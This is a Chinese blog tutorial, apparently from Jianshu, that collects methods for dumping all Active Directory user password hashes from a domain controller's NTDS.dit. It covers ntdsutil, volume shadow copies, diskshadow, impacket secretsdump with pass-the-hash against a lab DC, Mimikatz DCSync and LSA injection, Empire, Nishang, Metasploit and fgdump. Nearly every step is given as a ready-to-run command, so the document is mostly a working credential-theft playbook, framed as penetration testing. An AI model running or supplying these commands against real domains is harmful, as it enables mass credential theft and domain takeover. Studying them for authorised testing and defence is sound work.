域内用户Hash获取方式总结

[ 顶峰相见8号](https://www.jianshu.com/u/619fee1a6ee1)关注赞赏支持

# 域内用户Hash获取方式总结

#### 前言

在渗透测试的过程中，当我们已经是域管权限时，就可以实现提取所有域内用户的密码哈希以进行离线破解和分析，这是非常常见的一个操作，这些哈希值存储在域控制器(NTDS.DIT)中的数据库文件中，并带有一些其他信息，如用户名、散列值、组、GPP、OU等于活动目录相关的信息，它和SAM文件一样都是被操作系统锁定的，因此无法直接复制到其他位置以提取信息。

NTDS.dit文件位于Windows以下位置：

`C:\Windows\NTDS\NTDS.dit`

[](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2F41c72010-4028-4a92-9525-881d61844382.png)

[image.png](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2F41c72010-4028-4a92-9525-881d61844382.png)

#### NTDS提取

##### NTDSUTIL

NTDSUTIL是一个命令行工具，它是域控制器生态系统的一部分，其目的是为了使管理员能够访问和管理Windows Active
Directory数据库，但是，渗透测试人员和redteam可以用它来拍摄现有ntds.dit文件的快照，该文件可以复制到新位置以进行离线分析和密码哈希的提取

> ntdsutil  
>  activate instance ntds  
>  ifm  
>  create full C:\ntdsutil  
>  quit  
>  quit

[](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2F82a4dba7-0d84-4841-9be0-cde28f2e9357.png)

[image.png](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2F82a4dba7-0d84-4841-9be0-cde28f2e9357.png)

>
> [【一一帮助安全学习，所有资源获取处一一】](https://links.jianshu.com/go?to=https%3A%2F%2Fdocs.qq.com%2Fdoc%2FDV3RvY2ZFSFp6UENh)  
>  ①网络安全学习路线  
>  ②20份渗透测试电子书  
>  ③安全攻防357页笔记  
>  ④50份安全攻防面试指南  
>  ⑤安全红队渗透工具包  
>  ⑥网络安全必备书籍  
>  ⑦100个漏洞实战案例  
>  ⑧安全大厂内部视频资源  
>  ⑨历年CTF夺旗赛题解析

之后在C:\ntdsutil中将生成两个新文件夹：Active Directory和Registry：

[](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2F5bfcecc9-3a09-47cd-
aa3e-6355a55b8947.png)

[image.png](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2F5bfcecc9-3a09-47cd-
aa3e-6355a55b8947.png)

NTDS.DIT文件将保存在Active Directory中：  
[](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2Ff616c782-b94a-4f6c-95ad-46d514a488e6.png)

[image.png](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2Ff616c782-b94a-4f6c-95ad-46d514a488e6.png)

SAM和SYSTEM文件将保存到Registry文件夹中：

[](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2Fb75d2f8c-49a2-4823-8e3d-783176a3ec37.png)

[image.png](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2Fb75d2f8c-49a2-4823-8e3d-783176a3ec37.png)

之后可以使用ntdsdump进行离线提取Hash:

ntdsdump.exe -f ntds.dit -s SYSTEM

# 参数说明：

`ntdsdump.exe <-f ntds.dit> <-k HEX-SYS-KEY | -s system.hiv> [-o out.txt] [-h]
[-t JOHN|LC] * -f ntds.dit`路径 * -k 可选的十六进制格式的`SYSKEY * -s`可选的system.hiv路径 * -h
导出历史密码记录 * -t 导出格式，LC或JOHN * -o 导出到指定文件中 *  
[](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2F900d1192-49d5-4d09-ba40-f7998a7f88aa.png)

[image.png](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2F900d1192-49d5-4d09-ba40-f7998a7f88aa.png)

之后在CMd5解密网站进行解密解密即可：

[](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2Faf0f3da4-5987-4816-bd60-796b85826d38.png)

[image.png](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2Faf0f3da4-5987-4816-bd60-796b85826d38.png)

##### vssadmin

vssadmin是WIndows Server 2008和Win
7提供的VSS管理工具，可用于创建和删除卷影拷贝、列出卷影拷贝的信息(只能管理系统Provider创建的卷影拷贝)、显示已安装的所有卷影拷贝写入程序等，在内网渗透测试过程中，我们也可以使用vssadminn来提取ntds.dit文件，流程如下：

Step 1：在域控制器中打开命令环境，输入如下命令，创建一个C盘的影卷拷贝：

`vssadmin create shadow /for=c:`

[](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2Fba5722b4-2d20-4097-b366-05d576cc3128.png)

[image.png](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2Fba5722b4-2d20-4097-b366-05d576cc3128.png)

Step 2:将NTDS.dit和SYSTEM文件从创建的影卷中复制出来

    
    
    copy \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\NTDS\ntds.dit c:\ntds.dit
    copy \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\SYSTEM
    

[](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2Faf5d9964-0460-4ab6-bf34-fdd6a76e2e38.png)

[image.png](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2Faf5d9964-0460-4ab6-bf34-fdd6a76e2e38.png)

之后可以在C盘中看到成功复制ntds.dit文件：

[](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2Fb964f2ce-1a84-46d1-b028-8a026dafe04f.png)

[image.png](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2Fb964f2ce-1a84-46d1-b028-8a026dafe04f.png)

Step 3：之后执行以下命令删除影卷信息：

`vssadmin delete shadows /for=c: /quiet`

[](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2Fab5474fa-1563-4d6a-88ae-f9201075ac91.png)

[image.png](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2Fab5474fa-1563-4d6a-88ae-f9201075ac91.png)

Step 4：之后通过impacket来导出hash值

    
    
    ./secretsdump.py -system /root/vssadmin/SYSTEM -ntds /root/vssadmin/ntds.dit LOCAL
    

[](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2F09bb6e6b-e43a-46c1-a1e6-ef2f380bf7a8.png)

[image.png](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2F09bb6e6b-e43a-46c1-a1e6-ef2f380bf7a8.png)

##### vssown.vbs

与vssadmin程序类似，Tim
Tomes开发了vssown，它是一个可视化的基本脚本，可以创建和删除卷影副本，从卸载的卷影副本运行任意可执行文件，以及启动和停止卷影复制服务。

Step 1:启动影卷拷贝服务

    
    
    cscript vssown.vbs /start
    

[](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2Fa214f087-17a0-4d76-874e-f5338b1849d1.png)

[image.png](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2Fa214f087-17a0-4d76-874e-f5338b1849d1.png)

Step 2：创建一个C盘的影卷拷贝

    
    
    cscript vssown.vbs /create c
    

[](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2F071b4cff-f909-4824-b8c9-954c1d776a0b.png)

[image.png](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2F071b4cff-f909-4824-b8c9-954c1d776a0b.png)

Step 3:列出当前影卷拷贝

    
    
    cscript vssown.vbs /list
    

[](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2F7dfbb6a0-6338-4717-8074-d379961ccdcc.png)

[image.png](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2F7dfbb6a0-6338-4717-8074-d379961ccdcc.png)

Step 4：复制`ntds.dit、SYSTEM、SAM`文件

    
    
    copy \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit C:\vssown\ntds.dit
    copy \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\system32\config\SYSTEM C:\vssown\SYSTEM
    copy \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\system32\config\SAM C:\vssown\SAM
    

[](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2Fb972905e-4a15-4c17-838e-0780270cfd11.png)

[image.png](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2Fb972905e-4a15-4c17-838e-0780270cfd11.png)

Step 5:查看拷贝的文件

`dir c:\vssown\`

[](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2F8e94a71c-cdd4-4a19-b26a-7409855f7f8b.png)

[image.png](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2F8e94a71c-cdd4-4a19-b26a-7409855f7f8b.png)

Step 6：删除影卷拷贝

    
    
    cscript vssown.vbs /delete {54ECD66A-570C-4489-956F-9B83E4C8B1B9}
    

[](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2F5abe25ed-4b4c-4a75-b4c7-2f99a40d71c4.png)

[image.png](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2F5abe25ed-4b4c-4a75-b4c7-2f99a40d71c4.png)

Step 7：之后使用impacket导出Hash

    
    
    ./secretsdump.py -system /root/vssown/SYSTEM -ntds /root/vssown/ntds.dit LOCAL
    

[](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2Fda8cfd94-491b-4633-b327-9392a2c535f8.png)

[image.png](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2Fda8cfd94-491b-4633-b327-9392a2c535f8.png)

##### diskshadow

DiskShadow是Microsoft签名的二进制文件，用于协助管理员执行与卷复制服务（VSS）相关的操作。最初bohops在他的博客中写到了这个二进制文件。这个二进制文件有两个交互式和脚本模式，因此可以使用一个脚本文件，它将包含自动执行NTDS.DIT提取过程所需的所有命令。脚本文件可以包含以下行，以便创建新的卷影副本，装入新驱动器，执行复制命令并删除卷影副本，在使用时需要注意一点，DiskShadow二进制文件需要从C\Windows\System32路径执行，如果从另一个路径调用它，脚本将无法正确执行：

    
    
    set context persistent nowriters
    add volume c: alias someAlias
    create
    expose %someAlias% z:
    exec "cmd.exe" /c copy z:\windows\ntds\ntds.dit c:\ntds.dit
    delete shadows all
    reset
    

在cmd下执行以下命令：

    
    
    diskshadow.exe /s c:\diskshadow.txt
    

图片.png

之后查看c盘可以看到成功复制文件：

图片.png

导出ntds.dit后，可以键system.hive转储，因为system.hive中存放着ntds.dit的秘钥，如果没有该密钥，将无法查看ntds.dit中的信息：

    
    
    reg save hklm\system c:\system.hive
    

[](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2F888198f2-7554-4520-9a7e-7bb8cfe86ce6.png)

[image.png](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2F888198f2-7554-4520-9a7e-7bb8cfe86ce6.png)

之后使用impacket导出hash

./secretsdump.py -system /root/diskshadow/system.hive -ntds
/root/diskshadow/ntds.dit LOCAL

[](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2Fafcd9f3c-45c9-4690-ab47-8be44306e9b0.png)

[image.png](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2Fafcd9f3c-45c9-4690-ab47-8be44306e9b0.png)

#### NDTS Hash

##### Impacket

我们可以使用impacket工具包中的secretsdump来解析ntds.dit文件并导出散列：

`./secretsdump.py -system /root/system.hive -ntds /root/ntds.dit LOCAL`

[](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2F4f2d314a-f515-4e32-ad20-48804d3f3c3c.png)

[image.png](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2F4f2d314a-f515-4e32-ad20-48804d3f3c3c.png)

impacket还可以直接通过用户名和散列值进行验证，从远程域控制器中读取ntds.dit并转储域散列值：

`./secretsdump.py -hashes
aad3b435b51404eeaad3b435b51404ee:41945356c1b2adde08c00d0e48515b7e -just-dc
hacke.testlab/administrator@192.168.188.2`

[](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2F894f88f1-e898-4bfa-a0bb-e868663e8d98.png)

[image.png](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2F894f88f1-e898-4bfa-a0bb-e868663e8d98.png)

##### esedbexport

在这里我们需要通过安装libesedb从ntds.dit中导出dataable和link_table，在终端执行以下命令下载libesedb：

    
    
    git clone
    cd libesedb/
    ./synclibs.sh
    ./autogen.sh
    

[](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2Fd69917de-9a55-4d47-aea2-3cf57ce77a4c.png)

[image.png](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2Fd69917de-9a55-4d47-aea2-3cf57ce77a4c.png)

[](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2F7b862b74-f349-41b6-9640-1634360b9838.png)

[image.png](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2F7b862b74-f349-41b6-9640-1634360b9838.png)

[](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2Fd737bef7-4ff4-4e48-9cb3-19fd0ba5545a.png)

[image.png](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2Fd737bef7-4ff4-4e48-9cb3-19fd0ba5545a.png)

之后执行以下命令安装依赖：

    
    
    sudo apt install git autoconf automake autopoint libtool pkg-config
    

[](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2F23371c35-2add-4ac7-be32-83d59017000e.png)

[image.png](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2F23371c35-2add-4ac7-be32-83d59017000e.png)

之后执行以下命令对libesedb进行编译与安装：

    
    
    ./configure
    make
    sudo make install
    sudo ldconfig
    

[](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2Ffc29e706-1dfb-4e3a-8c64-fc0b990c4441.png)

[image.png](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2Ffc29e706-1dfb-4e3a-8c64-fc0b990c4441.png)

安装完成之后会在系统的/usr/local/bin目录下看的esedbexport程序，如下所示：

    
    
    ls /usr/local/bin/ | grep esedbexport
    

[](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2F207a221e-3cbb-4c73-8318-e2d77f60656e.png)

[image.png](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2F207a221e-3cbb-4c73-8318-e2d77f60656e.png)

之后使用esedbexport进行恢复操作，执行以下命令来提取表信息，操作时间视ntds.dit文件的大小而定，如果提取成功会在同一目录下生成一个文件夹，这里我们只提取dataable和link_table:

    
    
    esedbexport -m tables /root/ntds.dit
    

[](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2F4d16e06e-612f-4781-9f22-cc24aa727882.png)

[image.png](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2F4d16e06e-612f-4781-9f22-cc24aa727882.png)

导出信息如下所示：

[](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2Fc749791e-43a6-4c99-bef1-ea5a94bcc9d3.png)

[image.png](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2Fc749791e-43a6-4c99-bef1-ea5a94bcc9d3.png)

之后我们借助ntdsxtract来导出散列值，首先我们需要安装该工具：

    
    
    git clone 
    

图片.png

之后进入文件夹执行以下命令进行安装：

    
    
    python setup.py build && python setup.py install
    running build
    

图片.png

之后输入以下命令，将导出的ntds.dit.export文件夹和SYSTEM文件一并放入ntdsxtract文件夹并执行以下命令：

    
    
    ./dsusers.py ntds.dit.export/datatable.4 ntds.dit.export/link_table.7 output --syshive system.hive --passwordhashes --pwdformat ocl --ntoutfile ntout --lmoutfile lmout | tee all_user.txt
    

图片.png

之后会将域内的所有用户名和散列值导出到all_user.txt中：

图片.png

ntds.dit包含域内的所有信息，可以通过分析ntds.dit导出域内的计算机信息以及其他信息，命令如下：

    
    
    dscomputers.py ntds.dit.export/datatable.4 computer_output --csvoutfile all_computers.csv
    

图片.png

图片.png

#### NTDSDumpex

`NTDSDumpex.exe`程序也可以用于导出散列值得操作，在使用时只需要将`ntds.dit、SYSTEM、NTDSDumpex.exe`放到同一目录下，之后执行以下命令即可(效果并不理想，时常出现下面的问题)：

    
    
    NTDSDumpex.exe -d ntds.dit -s system
    

图片.png

#### 第三方工具

下面介绍几种常见的域内用户Hash获取的方法与策略~

##### Mimikatz

项目介绍：mimikatz用于从Windows操作系统内存中提取明文密码、散列、pin码和kerberos票据，同时mimikatz还可以执行传递散列、传递票证或构建黄金票证。  
工具使用：

a、获取所有域内用户的账户信息

    
    
    lsadump::dcsync /domain:hacke.testlab /all /csv
    

图片.png

b、通过使用/user参数指定域用户名来获取特定用户的所有帐户信息，包括其密码哈希

    
    
    lsadump::dcsync /domain:hacke.testlab /user:testuser
    

图片.png

  

图片.png

c、直接在域控制器中执行Mimikatz，通过lsass.exe进程dump哈希

    
    
    privilege::debug
    lsadump::lsa /inject
    

图片.png

##### Empire

提取域内所有用户hash值：

    
    
    usemodule credentials/mimikatz/dcsync_hashdump
    

dump特定帐户信息：

    
    
    (Empire: 8GLZTYXR) > usemodule credentials/mimikatz/dcsync
    (Empire: powershell/credentials/mimikatz/dcsync) > set user Al1ex
    (Empire: powershell/credentials/mimikatz/dcsync) > execute
    

[](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2F8a3f7b44-7d5a-4787-9805-5d191f9464bc.png)

[image.png](https://links.jianshu.com/go?to=https%3A%2F%2Fstorage.tttang.com%2Fmedia%2Fattachment%2F2022%2F09%2F30%2F8a3f7b44-7d5a-4787-9805-5d191f9464bc.png)

##### Nishang

Nishang是一个PowerShell框架，它让redteam和渗透测试人员能够对系统进行攻击性操作，Nishang中的VSS脚本可以用于自动提取所需的文件：NTDS.DIT，SAM和SYSTEM，这些文件将被解压缩到当前工作目录或指定的任何其他文件夹中。

    
    
    Import-Module .\Copy-VSS.ps1
    Copy-VSS //复制到当前目录
    Copy-VSS -DestinationDir C:\ShadowCopy //复制到指定目录
    

图片.png

之后通过Mimikatz来获取信息：

    
    
    lsadump::sam /sam:sam.hive /system:system.hive
    

图片.png

##### Metasploit

    
    
    run post/windows/gather/hashdump
    

图片.png

    
    
    run post/windows/gather/smart_hashdump
    

图片.png

如果已经拿到域控制器的现有Meterpreter会话，则可以使用命令hashdump，但是，此方法不被认为是安全的，因为可能会使域控崩掉

图片.png

##### fgdump

fgdump是一个比较老的可执行文件，可提取的LanMan和NTLM的密码哈希值，如果已获取本地管理员凭据，则可以在本地或远程执行。在执行期间，fgdump将尝试禁用可能在系统上运行的防病毒软件，如果成功，则会将所有数据写入两个文件中，如果存在防病毒或端点解决方案，则不应该将fgdump用作dump密码哈希的方法以避免检测，因为大多数防病毒公司(包括Microsoft的Windows
Defender)都会对将它kill掉

`fgdump.exe`  

图片.png

之后可以通过检查.pwdump文件的内容来get密码哈希值

  

图片.png

PS:速度超级慢，慢的卡死，强烈不推荐~

##### Invoke-DCSync

Invoke–DCSync是Nick Landers利用PowerView开发的powershell脚本，Invoke-
ReflectivePEInjection和PowerKatz的DLL
wrapper调用Mimikatz的DCSync方法检索哈希值，直接执行该函数将生成以下输出：

    
    
    Import-Module ./Invoke-DCSync.ps1
    Invoke-DCSync
    

图片.png

从上面可以看到结果将格式化为四个表：Domain，User，RID和Hash，当使用参数`-PWDumpFormat执行Invoke-
DCSync`将以以下格式检索哈希：

`user：id：lm：ntlm :::`

图片.png

#### 文末小结

本篇文章主要介绍了域内用户Hash的获取方法，同样在内网渗透中很有用

### 推荐阅读[更多精彩内容 __](https://www.jianshu.com/)

  * [内网渗透之Responder与Net-NTML hash](https://www.jianshu.com/p/1b545a8b8b1e)

原文链接：http://wyb0.com/posts/responder-and-ntml-hash/ 0x00 ...

[cws](https://www.jianshu.com/u/cc008b01f306)阅读 7,307评论 1赞 2

  * [Mimikatz获取系统密码攻防研究](https://www.jianshu.com/p/c0c02b2d1747)

1.1Mimikatz获取系统密码攻防研究 Simeon Mimikatz是法国人benjamin开发的一款功能强...

[simeon2015](https://www.jianshu.com/u/16acd6029bc6)阅读 1,874评论 0赞 0

  * [iOS获取设备的唯一标识的方法总结以及最好的方法](https://www.jianshu.com/p/0a2af82ccbfd)

一.UDID(Unique Device Identifier) UDID的全称是Unique Device Id...

[初xin工作室](https://www.jianshu.com/u/7d0d629d30d2)阅读 6,910评论 1赞 2

  * [iOS获取设备的唯一标识的方法总结以及最好的方法](https://www.jianshu.com/p/3dd2e043d10a)

我个人认为 （UUID + keychain） 的解决方法是目前最好的解决方法。 下面我列举几个方法做对比。 各种...

[iOS开发小学生](https://www.jianshu.com/u/f17ee77b009a)阅读 7,283评论 3赞 8

  * [iOS-常用的三种画板功能实现方式< UIBezierPath ,OpenGLES>](https://www.jianshu.com/p/8c145884cf2c)

由于项目需求需要用到一个画板功能,需要这个画板可以实时的画，并且需要保存画板点集合从一端发送给另一端 达到一个实时...

[踏遍青山](https://www.jianshu.com/u/a942711b360a)阅读 12,877评论 22赞 48

 